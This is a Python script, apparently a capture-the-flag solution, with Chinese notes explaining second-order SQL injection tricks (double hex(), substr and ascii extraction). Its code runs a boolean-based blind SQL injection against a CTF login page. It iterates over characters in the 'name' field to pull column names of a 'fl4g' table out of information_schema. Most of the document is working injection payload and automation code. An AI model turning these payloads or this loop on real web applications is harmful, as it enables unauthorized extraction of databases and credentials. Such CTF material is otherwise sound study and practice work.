import requests
import time

"""
二次注入原理：
insert into users value('email':'xx@mail.com', 'user':'a1', 'pass':'123456')
XSS sql=>闭合
1'+(select hex(hex(database())))+'0
insert into users value('email':'xx@mail.com', 'user':1'+(select hex(hex(database())))+'0, 'pass':'123456')
原因1：mysql中
0+1=1
1+a=1 因为a被置空了
1+1a123=2 字符a后面字符串被置空了
原因2：两层hex()函数
一层hex有ABCDEF字符串还是会被置空截断，两层hex就完全是数字了。
获取到的内容可能不完整

ctf的数据库名字一般是flag、password、root

如何完整？
substr(passwd, 1, 2) => pa
substr(passwd from 1 for 2) => pa
select * from flag
substr((select * from flag) from %d for 1) 
0'+ascii(substr((select * from flag) from %d for 1))+'0
赛前要准备好sql注入fuzz。

python的re库里面有search函数查找指定页面的指定内容。
re.search()
使用注意页面的字符格式。

"""

url = "http://76af3b30-86c8-4196-a99f-2e250fd602f3.node3.buuoj.cn/login.php"
dictionary = '}qwertyuiopasdfghjklzxcvbnm-=+_,.1234567890{'
flag = ""

for num in range(1, 500):
    print(num)
    for i in dictionary:
        data = {
            'name': "admin' and substr((seLect(group_concat(column_name))from(information_schema.columns)where(table_name='fl4g')),{0},1)='{1}' #".format(num, i),
            'pass': '123456'}
        res = requests.post(url=url, data=data)
        time.sleep(0.1)
        if res.text == r'{"error":1,"msg":"\u8d26\u53f7\u6216\u5bc6\u7801\u9519\u8bef"}':
            flag += i
            print(flag)
            break
print(flag)
